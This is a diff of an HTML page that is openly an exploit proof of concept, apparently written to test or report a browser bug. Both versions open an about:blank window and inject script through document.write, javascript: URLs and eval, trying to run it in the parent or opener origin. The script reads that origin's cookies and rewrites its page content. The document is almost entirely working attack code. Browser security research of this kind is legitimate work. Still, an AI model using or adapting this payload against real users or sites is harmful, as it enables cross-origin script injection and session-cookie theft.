@@ -1,19 +1,34 @@
+<!doctype html>
+<html>
+<head>
+    <style>
+        html { font-family: sans-serif; }
+        h1 { font-size: 1.4em; }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<h1>Click this iframe to trigger XSS in parent origin</h1>
+
 <script>
-    function exploit() {
-        // Open a new window to about:blank, which inherits the parent's origin temporarily
-        var w = window.open('about:blank');
-        
-        // Immediately inject malicious script into the new window's document
-        try {
-            w.document.write('<script>alert("XSS in parent origin: " + window.opener.document.cookie);<\/script>');
-        } catch (e) {
-            // Fallback method if write is blocked
-            setTimeout(() => {
-                w.location = 'javascript:alert("Fallback XSS: " + document.cookie)';
-            }, 100);
-        }
-    }
-    
-    // Trigger the exploit attempt
-    setTimeout(exploit, 0);
+    document.body.addEventListener('click', function() {
+        // Open a window with a javascript: URL targeting the PARENT's origin
+        const newWin = window.open('about:blank');
+
+        // Race condition: Inject script before origin checks are enforced
+        setTimeout(() => {
+            try {
+                // Directly modify the PARENT's DOM via the vulnerability
+                newWin.location = 'javascript:opener.parent.document.body.innerHTML += "<h3>Hijacked origin: " + opener.parent.location.origin + "</h3>";';
+                
+                // Steal cookies from the parent's origin
+                newWin.eval('alert("Parent cookies: " + opener.parent.document.cookie);');
+            } catch(e) {
+                // Fallback using deferred execution
+                opener.parent.location = 'javascript:alert("XSS: " + document.cookie)';
+            }
+        }, 0);
+    });
 </script>
+</body>
+</html>
